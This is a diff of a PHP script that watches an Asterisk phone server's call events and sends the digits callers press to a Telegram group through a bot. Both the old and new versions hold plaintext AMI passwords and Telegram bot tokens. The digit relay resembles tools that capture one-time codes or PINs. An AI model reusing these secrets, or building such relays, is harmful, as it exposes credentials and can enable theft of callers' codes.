@@ -2,8 +2,8 @@
 // AMI connection details
 $host = '127.0.0.1';    // Asterisk server IP
 $port = 5038;           // AMI port
-$username = 'admin';    // AMI username
-$password = 'C1C/u8rPNdCP';  // AMI password
+$username = 'ch8W0jBkmCsH';    // AMI username
+$password = 'epK9rfpNwKbv';  // AMI password
 
 // Open a socket to the AMI
 $socket = fsockopen($host, $port, $errno, $errstr, 30);
@@ -74,8 +74,12 @@ while (!feof($socket)) {
 
         // Get the callerid and callee
         $caller = $eventData['CallerIDNum'];
-        $callee = $eventData['ConnectedLineNum'];
-        
+        $callee = $eventData['Interface'];
+
+	// Split by `/` and `@`
+	$parts = explode('/', $callee); // Split at the `/`
+	$callee = explode('@', $parts[1])[0]; // Further split at `@`
+  
         //101 answered call from 44763636474
         $output = "$callee answered call from $caller\n";
         
@@ -96,8 +100,12 @@ while (!feof($socket)) {
 
         // Get the callerid and callee
         $caller = $eventData['CallerIDNum'];
-        $callee = $eventData['ConnectedLineNum'];
-        
+        $callee = $eventData['Interface'];
+
+	// Split by `/` and `@`
+	$parts = explode('/', $callee); // Split at the `/`
+	$callee = explode('@', $parts[1])[0]; // Further split at `@`        
+
         //101 finished on phone
         $output = "$callee finished on phone from $caller\n";
         echo $output;
@@ -115,7 +123,7 @@ function getdtmf($dtmf) {
     $curl = curl_init();
 
     curl_setopt_array($curl, array(
-        CURLOPT_URL => 'https://api.telegram.org/bot8178049394:AAGvWMrdWzJS0brFmCBL_dyUKk6ZMTGDwYY/sendMessage?chat_id=-1002347274383&text=' . urlencode($dtmf),
+        CURLOPT_URL => 'https://api.telegram.org/bot7636645795:AAHFoA7GuflyW81tmsF6_Tl5O4vo7HVB3Ok/sendMessage?chat_id=-1002163292165&text=' . urlencode($dtmf),
         CURLOPT_RETURNTRANSFER => true,
         CURLOPT_ENCODING => '',
         CURLOPT_MAXREDIRS => 10,
